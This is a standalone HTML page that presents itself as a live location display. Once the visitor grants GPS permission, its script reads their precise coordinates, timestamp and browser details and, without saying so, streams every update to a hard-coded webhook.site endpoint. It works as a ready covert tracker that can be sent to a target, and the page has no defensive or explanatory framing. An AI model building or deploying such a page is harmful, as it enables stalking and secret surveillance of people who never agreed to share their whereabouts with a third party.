<!DOCTYPE html>
<html>
<head>
  <title>Live Location Tracking</title>
  <meta charset="UTF-8">
</head>
<body>

<h3>Live Location Tracking</h3>
<p id="status">Waiting for GPS permissionâ€¦</p>
<p id="coords"></p>

<script>
if (!navigator.geolocation) {
  document.getElementById("status").innerText =
    "Geolocation not supported on this device.";
} else {

  document.getElementById("status").innerText =
    "Live tracking started. Keep this page open.";

  navigator.geolocation.watchPosition(
    (pos) => {
      const data = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      };

      // Display on user's screen
      document.getElementById("coords").innerText =
        `Latitude: ${data.latitude}
Longitude: ${data.longitude}
Accuracy: ${data.accuracy} meters`;

      // Send LIVE updates to your endpoint
      fetch("https://webhook.site/30f14c22-c02f-4d1c-ad3c-6e72844a7dc6", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    },
    (err) => {
      document.getElementById("status").innerText =
        "Location access stopped or denied.";
    },
    {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 15000
    }
  );
}
</script>

</body>
</html>
